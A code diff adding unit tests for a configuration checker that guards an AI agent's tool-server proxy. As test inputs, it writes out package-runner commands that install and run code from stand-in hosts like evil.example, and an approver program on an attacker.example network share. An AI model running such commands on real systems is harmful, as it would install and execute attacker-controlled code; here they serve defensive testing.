@@ -159,6 +159,74 @@ class WhyAServerIsBroken(DoctorTest):
                 self.assertEqual(servers["np"]["status"], "broken")
                 self.assertIn("starts the proxy only after other words", servers["np"]["findings"][0]["text"])
 
+    def test_a_package_runner_that_installs_from_a_url_or_a_path_is_not_protected(self):
+        # Each of these installs whatever is at that place under the name agent-sentinel, and runs it.
+        entry = self.wrapped("s")
+        proxy_words = entry["args"][3:]  # proxy --policy ...
+        for launcher in (["uvx", "agent-sentinel@git+https://evil.example/x"],
+                         ["uvx", "--from", "agent-sentinel@file:///C:/Users/Public/evil", "agent-sentinel"],
+                         ["pipx", "run", "--spec", "agent-sentinel@ git+https://evil.example/x", "agent-sentinel"],
+                         ["pipx", "run", "agent-sentinel@https://evil.example/x.whl"]):
+            with self.subTest(launcher=launcher):
+                code, servers, _ = self.statuses(self.config({"s": {"command": launcher[0],
+                                                                    "args": [*launcher[1:], *proxy_words]}}))
+                self.assertEqual(code, 1)
+                self.assertEqual(servers["s"]["status"], "broken")
+                self.assertIn("from a package that is not agent-sentinel at a version",
+                              servers["s"]["findings"][0]["text"])
+
+    def test_an_option_value_the_proxy_refuses_is_broken(self):
+        for extra, expected in (
+            (["--max-message-bytes", "2147483648"], "--max-message-bytes '2147483648' (must be 1 to 1073741824 bytes)"),
+            (["--max-message-bytes=0"], "--max-message-bytes '0'"),
+            (["--max-message-bytes", "abc"], "must be a whole number of bytes"),
+            (["--approval-timeout", "abc"], "must be a whole number of seconds"),
+            (["--approval-timeout", "0"], "--approval-timeout '0'"),
+            (["--tool-names", "loud"], "--tool-names 'loud' (choose from strict, warn, off)"),
+            (["--pass-env", "*"], "'*' would pass every variable"),
+            (["--approve-with", "telepathy"], "unknown approver"),
+            (["--approve-with", "command:relative/approve"], "is a relative path"),
+            (["--approve-with", "dialog", "--approve-with", "dialog"], "--approve-with dialog is given twice"),
+            (["--elicitation-host", "localhost"], "the proxy will not start: it cannot use --elicitation-host"),
+            (["--quiet", "--verbose"], "--quiet and --verbose are both given"),
+        ):
+            with self.subTest(extra=extra):
+                code, servers, _ = self.statuses(self.config({"s": self.wrapped("s", *extra)}))
+                self.assertEqual(code, 1)
+                self.assertEqual(servers["s"]["status"], "broken")
+                texts = " | ".join(finding["text"] for finding in servers["s"]["findings"])
+                self.assertIn(expected, texts)
+                self.assertNotIn("protected:", texts)
+        # The proxy checks every --name it is given, not only the last.
+        status, text = self.reasons(self.wrapped("bad name!", "--name", "good"))
+        self.assertEqual(status, "broken")
+        self.assertIn("the proxy refuses the --name 'bad name!'", text)
+
+    def test_option_values_the_proxy_takes_are_fine(self):
+        extra = ["--max-message-bytes", "1073741824", "--approval-timeout", "60", "--tool-names", "strict",
+                 "--pass-env", "GITHUB_*", "--approve-with", "dialog", "--approve-with", "elicitation",
+                 "--approve-with", f"command:{sys.executable}", "--elicitation-host", "*.example.com", "--quiet"]
+        status, text = self.reasons(self.wrapped("s", *extra))
+        self.assertEqual(status, "protected", text)
+
+    @unittest.skipUnless(sys.platform == "win32", "network paths of this form are a Windows matter")
+    def test_an_approver_on_another_machine_is_never_looked_at(self):
+        looked_at = []
+        real = {name: getattr(os.path, name) for name in ("isfile", "isdir", "exists", "getsize")}
+
+        def spy(name):
+            def look(path, *args, **kwargs):
+                looked_at.append(str(path))
+                return real[name](path, *args, **kwargs)
+            return look
+
+        entry = self.wrapped("s", "--approve-with", r"command:\\attacker.example\share\approve.exe")
+        with mock.patch.multiple(os.path, **{name: spy(name) for name in real}):
+            status, text = self.reasons(entry)
+        self.assertEqual([path for path in looked_at if "attacker" in path], [])
+        self.assertEqual(status, "broken")
+        self.assertIn("is on another machine; doctor does not open network paths", text)
+
     def test_a_python_without_agent_sentinel_cannot_start_the_proxy(self):
         self.installed_version.return_value = None
         status, text = self.reasons(self.wrapped("s"))
@@ -349,6 +417,20 @@ class PackagesAndSecrets(DoctorTest):
             with self.subTest(name=name):
                 self.assertFalse(cli_doctor.looks_secret(name))
 
+    def test_a_secret_word_with_a_digit_attached_is_still_a_secret_word(self):
+        for name in ("GITHUB_TOKEN2", "API_KEY2", "apiKey2", "accessToken2", "Secret2", "KEY2_ID", "token1"):
+            with self.subTest(name=name):
+                self.assertTrue(cli_doctor.looks_secret(name))
+        for name in ("OAUTH2_CLIENT_ID", "S3_BUCKET", "HTTP2_ENABLED", "PATH2", "MONKEY2"):
+            with self.subTest(name=name):
+                self.assertFalse(cli_doctor.looks_secret(name))
+        # An opaque password has no recognisable format: only its name gives it away.
+        entry = {"command": "npx", "args": ["x@1.0.0"], "env": {"GITHUB_TOKEN2": "hunter22-a", "API_KEY2": "b",
+                                                                "apiKey2": "c", "LOG_LEVEL": "debug"}}
+        _, out, _ = self.doctor(self.config({"s": entry}))
+        self.assertIn("env holds GITHUB_TOKEN2, API_KEY2, apiKey2 in plain text in this file (values not shown)", out)
+        self.assertNotIn("hunter22", out)
+
     def test_remote_headers_are_named_not_shown(self):
         entry = {"url": "https://x/mcp", "headers": {"Authorization": "Bearer hunter22-value"}}
         _, out, _ = self.doctor(self.config({"s": entry}))
@@ -384,6 +466,14 @@ class Files(DoctorTest):
         code, _, err = self.doctor(self.folder / "missing.json")
         self.assertEqual(code, 2)
         self.assertIn("there is no file at", err)
+
+    def test_a_leading_tilde_is_the_home_folder(self):
+        # Windows PowerShell 5.1 and cmd pass "~" on as it is.
+        self.write("user/servers.json", {"mcpServers": {"good": self.wrapped("good")}})
+        code, servers, report = self.statuses("~/servers.json")
+        self.assertEqual(code, 0)
+        self.assertEqual(servers["good"]["status"], "protected")
+        self.assertEqual(report["configs"][0]["path"], str(self.user / "servers.json"))
 
     def test_vscode_files_use_their_own_key(self):
         path = self.write("project/.vscode/mcp.json", {"servers": {"s": {"type": "stdio", "command": "npx",
